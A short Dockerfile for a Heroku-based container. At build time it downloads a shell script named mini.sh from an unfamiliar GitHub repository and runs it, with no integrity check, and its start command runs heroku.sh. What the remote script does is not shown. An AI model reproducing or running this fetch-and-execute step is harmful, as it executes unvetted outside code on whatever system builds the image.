FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
CMD bash heroku.sh
